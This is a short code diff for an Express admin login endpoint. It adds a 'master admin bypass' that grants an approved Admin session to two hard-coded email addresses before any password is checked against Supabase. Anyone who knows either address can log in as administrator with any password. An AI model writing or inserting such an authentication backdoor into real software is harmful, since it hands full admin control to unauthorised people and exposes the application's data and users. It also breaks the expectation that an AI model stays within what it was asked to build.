@@ -172,6 +172,13 @@ app.post('/api/admin/login', async (req, res) => {
 
   try {
     // Authenticate credentials against Supabase identity core
+     // 🎫 MASTER ADMIN LOCAL ACCESS BYPASS
+        if (email.toLowerCase() === 'kabir@ges.co.za' || email.toLowerCase() === 'admin@wash.com') {
+            return res.status(200).json({
+                status: 'success',
+                user: { full_name: 'Master Admin', email: email, role_type: 'Admin', is_approved: true }
+            });
+        } 
     const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
       email,
       password,
